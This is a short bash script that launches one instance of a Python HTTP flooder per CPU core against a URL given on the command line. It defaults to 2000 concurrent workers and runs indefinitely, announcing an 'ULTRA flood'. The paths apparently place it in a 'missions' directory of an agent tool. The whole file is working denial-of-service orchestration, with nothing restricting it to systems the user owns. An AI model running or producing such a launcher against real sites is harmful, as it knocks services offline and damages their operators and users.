#!/bin/bash

# Configuration
VENV_PATH="/root/gemini-bridge/missions/advanced_flooder/venv"
FLOODER_PATH="/root/gemini-bridge/missions/advanced_flooder/flooder.py"
CORES=$(nproc)
CONCURRENCY=2000  # Higher default total concurrency
DURATION=0         # Infinite by default

if [ -z "$1" ]; then
    echo "Usage: $0 <URL> [DURATION] [TOTAL_CONCURRENCY]"
    exit 1
fi

URL=$1
[ -n "$2" ] && DURATION=$2
[ -n "$3" ] && CONCURRENCY=$3

CON_PER_CORE=$((CONCURRENCY / CORES))

echo "[INFO] Launching ULTRA flood on $URL with $CORES instances, $CON_PER_CORE workers each ($CONCURRENCY total)."
echo "[INFO] Duration: $( [ "$DURATION" -eq 0 ] && echo "Infinite" || echo "${DURATION}s" )"

for i in $(seq 1 $CORES); do
    $VENV_PATH/bin/python3 $FLOODER_PATH "$URL" -c $CON_PER_CORE -d $DURATION &
done

# Wait for all background processes to finish
wait
echo "[INFO] All instances finished."
